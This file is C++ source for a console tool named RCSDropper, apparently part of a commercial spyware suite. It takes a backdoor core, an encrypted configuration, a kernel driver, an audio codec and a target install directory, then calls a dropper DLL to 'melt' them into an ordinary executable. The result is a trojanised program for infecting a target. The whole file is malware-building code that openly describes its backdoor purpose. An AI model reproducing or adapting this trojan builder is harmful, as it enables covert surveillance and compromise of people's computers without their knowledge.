// RCSDropper.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>
#include "dropper.h"


int _tmain(int argc, _TCHAR* argv[])
{	
	DropperT CreateDropper;
	GetLastErrorT DrGetLastError;
	HMODULE hDropper;
	CHAR *DropperParams[256];	
	HANDLE hFile;
	UINT index;
	BOOL ret = FALSE;
	CHAR szOutputFile[MAX_PATH];
	TCHAR *wsExeFile; 
	TCHAR *wsOutputFile;
	MelterStruct MS;

	ZeroMemory(&MS, sizeof(MelterStruct));

	if (argc != 9) {
		printf("ERROR: \n");
		printf("  usage:  RCSWin32Dropper.exe  <core> <conf> <driver> <codec> <instdir> <manifest> <input> <output>\n\n");
		printf("  <core> is the backdoor core\n");
		printf("  <conf> is the backdoor encrypted configuration\n");
		printf("  <driver> is the kernel driver\n");
		printf("  <codec> is the audio codec\n");
		printf("  <instdir> is the backdoor install directory (on the target)\n");
		printf("  <manifest> is a boolean flag for modifying the manifest\n");
		printf("  <input> is the exe to be melted\n");
		printf("  <output> is the output file\n\n");
		return 0;
	}

	sprintf(MS.core, "%S", argv[1]);
	sprintf(MS.conf, "%S", argv[2]);
	if (_wcsicmp(argv[3], L"null")) {
		sprintf(MS.driver, "%S", argv[3]);
	}
	if (_wcsicmp(argv[4], L"null")) {
		sprintf(MS.codec, "%S", argv[4]);
	}
	sprintf(MS.instdir, "%S", argv[5]);
	
	if (!_wcsicmp(argv[6], L"1") )
		MS.manifest = TRUE;

	wsExeFile = _wcsdup(argv[7]);
	wsOutputFile = _wcsdup(argv[8]);

	/************************************************************************/
	/*  SANITY CHECKS                                                       */
	/************************************************************************/
	if ((hDropper = LoadLibrary(DROPPERDLL)) == NULL) {
		printf("Cannot find the dropper dll [%S]\n", DROPPERDLL);
		return ERROR_NO_DROPPER;
	}

	if ((CreateDropper = (DropperT) GetProcAddress(hDropper, DROPPERFUNC)) == NULL) {
		printf("Cannot find the function in the dropper [%S]\n", DROPPERFUNC);
		return ERROR_INVALID_DROPPER;
	}

	if ((DrGetLastError = (GetLastErrorT) GetProcAddress(hDropper, DROPPERERROR)) == NULL) {
		printf("Cannot find the function in the dropper [%S]\n", DROPPERERROR);
		return ERROR_INVALID_DROPPER;
	}

	if ((hFile = CreateFile(wsExeFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0)) == INVALID_HANDLE_VALUE ) {
		printf("Cannot find the input exe file [%S]\n", wsExeFile);
		return ERROR_EMBEDDING;
	} else {
		CloseHandle(hFile);
	}

	if ((hFile = CreateFile(argv[1], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0)) == INVALID_HANDLE_VALUE ) {
		printf("Cannot find the core file [%S]\n", argv[1]);
		return ERROR_EMBEDDING;
	} else {
		CloseHandle(hFile);
	}

	if ((hFile = CreateFile(argv[2], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0)) == INVALID_HANDLE_VALUE ) {
		printf("Cannot find the config file [%S]\n", argv[2]);
		return ERROR_EMBEDDING;
	} else {
		CloseHandle(hFile);
	}

	if ((hFile = CreateFile(argv[3], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0)) == INVALID_HANDLE_VALUE ) {
		printf("Cannot find the driver file [%S]\n", argv[3]);
		return ERROR_EMBEDDING;
	} else {
		CloseHandle(hFile);
	}

	if ((hFile = CreateFile(argv[4], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0)) == INVALID_HANDLE_VALUE ) {
		printf("Cannot find the codec file [%S]\n", argv[4]);
		return ERROR_EMBEDDING;
	} else {
		CloseHandle(hFile);
	}
	/************************************************************************/
	/*  READY TO GO                                                         */
	/************************************************************************/

	printf("Ready to go...\n");
	printf("CORE          [%s]\n", MS.core);
	printf("CONFIGURATION [%s]\n", MS.conf);
	printf("INSTALL DIR   [%s]\n", MS.instdir);
	printf("DRIVER        [%s]\n", (MS.driver) ? MS.driver : "null");
	printf("CODEC         [%s]\n", (MS.codec) ? MS.codec : "null");
	printf("MANIFEST      [%d]\n", MS.manifest);
	printf("INPUT         [%S]\n", wsExeFile);
	printf("OUTPUT        [%S]\n\n", wsOutputFile);

	if (!CopyFile(wsExeFile, wsOutputFile, FALSE) ) {
		printf("Cannot create output file [%S]\n", wsOutputFile);
		return ERROR_OUTPUT;
	} else {
		sprintf(szOutputFile, "%S", wsOutputFile);
	}

	/************************************************************************/
	/* PREPARING PARAMETERS                                                 */
	/************************************************************************/
	index = 0;

	DropperParams[index++] = NULL;							// argv[0] NULL
	DropperParams[index++] = szOutputFile;					// Nome file da infettare 
	DropperParams[index++] = MS.instdir;					// directory di installazione
	DropperParams[index++] = MS.core;						// core file name
	DropperParams[index++] = MS.conf;						// config file 

	if (MS.driver)   DropperParams[index++] = MS.driver;	// driver file 
	if (MS.codec)    DropperParams[index++] = MS.codec;		// codec file 
	if (MS.manifest) DropperParams[index++] = "-m";			// manifest file 

	/************************************************************************/
	/* DROPPER                                                              */
	/************************************************************************/
	try {
		ret = CreateDropper(index, DropperParams);
	} catch (...) {
		printf("Error while running dropper\n");
		DeleteFile(wsOutputFile);
		return ERROR_POLYMER;
	} 

	if(!ret) {
		if ( DrGetLastError() ) {
			printf("Error embedding manifest: try to change melting EXE!\n");
			DeleteFile(wsOutputFile);
			return ERROR_MANIFEST;
		} else {
			DWORD err = GetLastError();
			printf("Error building exe [%d]\n", err);
			DeleteFile(wsOutputFile);
			return ERROR_OUTPUT;
		}
	}

	printf("Output file melted... ok\n");

	FreeLibrary(hDropper);

	return ERROR_SUCCESS;
}

